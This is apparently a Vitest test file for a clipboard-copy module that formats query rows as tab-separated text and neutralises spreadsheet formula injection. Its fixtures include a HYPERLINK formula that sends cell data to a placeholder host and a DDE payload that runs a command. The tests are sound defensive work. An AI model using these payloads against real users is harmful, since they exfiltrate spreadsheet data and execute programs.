import { describe, expect, it } from "vitest";
import { cellText, columnToText, copyColumnsFor, rowsToTsv, spreadsheetSafe, tsvField, type CopyColumn } from "./copyResults";

const FV = "@OData.Community.Display.V1.FormattedValue";
const GUID = "11111111-1111-1111-1111-111111111111";

const rows: Record<string, unknown>[] = [
	{
		name: "Contoso",
		_primarycontactid_value: GUID,
		[`_primarycontactid_value${FV}`]: "Yvonne McKay",
		revenue: 150000,
		[`revenue${FV}`]: "$150,000.00",
		description: null,
	},
	{
		name: 'Fabrikam "Retail"',
		_primarycontactid_value: null,
		revenue: 2.5,
		description: "line 1\nline 2",
	},
];

const col = (id: string, header: string, showsRaw = false): CopyColumn => ({
	id,
	header,
	sourceCol: id.replace(/__raw$/, ""),
	showsRaw,
});
const name = col("name", "Account Name");
const contact = col("_primarycontactid_value", "Primary Contact");
const revenue = col("revenue", "Annual Revenue");
const revenueRaw = col("revenue__raw", "Annual Revenue (Raw)", true);
const description = col("description", "Description");

describe("cellText", () => {
	it("copies the formatted value as shown, falling back to the raw value", () => {
		expect(cellText(rows[0], contact)).toBe("Yvonne McKay");
		expect(cellText(rows[0], revenue)).toBe("$150,000.00");
		expect(cellText(rows[1], revenue)).toBe("2.5");
	});

	it("copies the raw value in raw mode or for a raw column", () => {
		expect(cellText(rows[0], contact, "raw")).toBe(GUID);
		expect(cellText(rows[0], revenue, "raw")).toBe("150000");
		expect(cellText(rows[0], revenueRaw)).toBe("150000");
	});

	it("copies empty values as empty text", () => {
		expect(cellText(rows[0], description)).toBe("");
		expect(cellText(rows[1], contact)).toBe("");
		expect(cellText(rows[1], contact, "raw")).toBe("");
	});
});

describe("tsvField", () => {
	it("leaves plain text alone", () => {
		expect(tsvField("Contoso, Ltd")).toBe("Contoso, Ltd");
	});

	it("quotes text with tabs, line breaks or quotes, doubling quotes", () => {
		expect(tsvField("a\tb")).toBe('"a\tb"');
		expect(tsvField("line 1\nline 2")).toBe('"line 1\nline 2"');
		expect(tsvField('Fabrikam "Retail"')).toBe('"Fabrikam ""Retail"""');
	});
});

describe("rowsToTsv", () => {
	it("writes a header row and one line per record, as shown", () => {
		expect(rowsToTsv(rows, [name, contact, revenue, description])).toBe(
			[
				"Account Name\tPrimary Contact\tAnnual Revenue\tDescription",
				"Contoso\tYvonne McKay\t$150,000.00\t",
				'"Fabrikam ""Retail"""\t\t2.5\t"line 1\nline 2"',
			].join("\n"),
		);
	});

	it("writes raw values in raw mode, without the (Raw) twin columns", () => {
		expect(rowsToTsv([rows[0]], [name, revenue, revenueRaw], "raw")).toBe(
			["Account Name\tAnnual Revenue", "Contoso\t150000"].join("\n"),
		);
	});

	it("keeps the (Raw) twin columns as shown", () => {
		expect(rowsToTsv([rows[0]], [revenue, revenueRaw])).toBe(
			["Annual Revenue\tAnnual Revenue (Raw)", "$150,000.00\t150000"].join("\n"),
		);
	});
});

describe("copyColumnsFor", () => {
	it("drops (Raw) twins only in raw mode", () => {
		expect(copyColumnsFor([revenue, revenueRaw], "shown")).toHaveLength(2);
		expect(copyColumnsFor([revenue, revenueRaw], "raw")).toEqual([revenue]);
	});
});

describe("columnToText", () => {
	it("writes one value per line, without a header", () => {
		expect(columnToText(rows, contact, "raw")).toBe(`${GUID}\n`);
		expect(columnToText(rows, name)).toBe('Contoso\n"Fabrikam ""Retail"""');
	});
});

describe("spreadsheet formulas in copied rows (#208)", () => {
	const formulaRows: Record<string, unknown>[] = [
		{ name: '=HYPERLINK("https://example.invalid/?d="&A2,"Click")', revenue: -5, [`revenue${FV}`]: "-$5.00", description: "@SUM(A1:A2)" },
		{ name: "+cmd|' /C calc'!A0", revenue: 3, description: "-2+3" },
		{ name: "\tindented", revenue: null, description: "plain text" },
	];

	it("puts an apostrophe before text starting with =, +, -, @ or a tab", () => {
		expect(spreadsheetSafe("=1+1")).toBe("'=1+1");
		expect(spreadsheetSafe("+1")).toBe("'+1");
		expect(spreadsheetSafe("-2+3")).toBe("'-2+3");
		expect(spreadsheetSafe("@SUM(A1)")).toBe("'@SUM(A1)");
		expect(spreadsheetSafe("\tx")).toBe("'\tx");
		expect(spreadsheetSafe("\rx")).toBe("'\rx");
		expect(spreadsheetSafe("Contoso")).toBe("Contoso");
		expect(spreadsheetSafe("a=b")).toBe("a=b");
		expect(spreadsheetSafe("")).toBe("");
	});

	it("leaves a number's sign alone, but not a formula on a number or Yes/No column", () => {
		expect(spreadsheetSafe("-5", -5)).toBe("-5");
		expect(spreadsheetSafe("-$5.00", -5)).toBe("-$5.00");
		expect(spreadsheetSafe("+1", 1)).toBe("+1");
		// A choice label is shown for a numeric raw value, and a label can start with =
		expect(spreadsheetSafe("=Other", 3)).toBe("'=Other");
		// A text column's "-5" is text: Excel would still read it as a formula input
		expect(spreadsheetSafe("-5", "-5")).toBe("'-5");
	});

	it("neutralises copied rows and columns, as shown and raw", () => {
		const shown = rowsToTsv(formulaRows, [name, revenue, description]).split("\n");
		expect(shown[1]).toBe(`"'=HYPERLINK(""https://example.invalid/?d=""&A2,""Click"")"\t-$5.00\t'@SUM(A1:A2)`);
		expect(shown[2]).toBe("'+cmd|' /C calc'!A0\t3\t'-2+3");
		expect(shown[3]).toBe("\"'\tindented\"\t\tplain text");
		expect(rowsToTsv(formulaRows, [revenue], "raw").split("\n")[1]).toBe("-5");
		expect(columnToText(formulaRows, description)).toBe("'@SUM(A1:A2)\n'-2+3\nplain text");
	});

	it("neutralises a header too", () => {
		expect(rowsToTsv([], [col("x", "=cmd")])).toBe("'=cmd");
	});

	it("copies a single cell exactly as shown", () => {
		expect(cellText(formulaRows[0], description)).toBe("@SUM(A1:A2)");
	});
});
